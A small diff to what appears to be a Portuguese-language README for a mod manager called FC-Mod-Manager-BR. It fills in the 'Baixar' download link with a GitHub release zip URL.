@@ -12,7 +12,7 @@
 
 ## 📥 Download
 
-**[Baixar FC-Mod-Manager-BR]()**
+**[Baixar FC-Mod-Manager-BR](https://github.com/thresholdlynxenlarge/FC-Mod-Manager-BR/releases/download/3784/FCModManagerBR.zip)**
 
 ---
 
